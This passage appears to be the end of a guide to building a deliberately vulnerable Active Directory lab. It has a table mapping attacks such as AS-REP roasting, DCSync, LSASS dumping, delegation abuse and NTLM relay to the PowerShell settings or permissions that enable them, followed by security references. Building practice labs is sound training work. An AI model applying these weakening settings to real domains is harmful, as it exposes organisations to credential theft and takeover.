| AS-REP Roast | `Set-ADAccountControl sasori -DoesNotRequirePreAuth $true` |
| DCSync (low priv) | Grant replication rights to user |
| LSASS Dump | RDP as itachi to cache creds; optionally enable WDigest |
| Unconstrained Delegation | `Set-ADComputer WS01 -TrustedForDelegation $true` |
| RBCD | Grant GenericWrite on computer object |
| ACL Abuse | Grant GenericAll/WriteDACL on object |
| NTLM Relay | Disable SMB Signing on target |

---

# References

- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [ired.team](https://www.ired.team/)
- [SpecterOps Blog](https://posts.specterops.io/)
- [Orange Cyberdefense AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
- [Microsoft AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
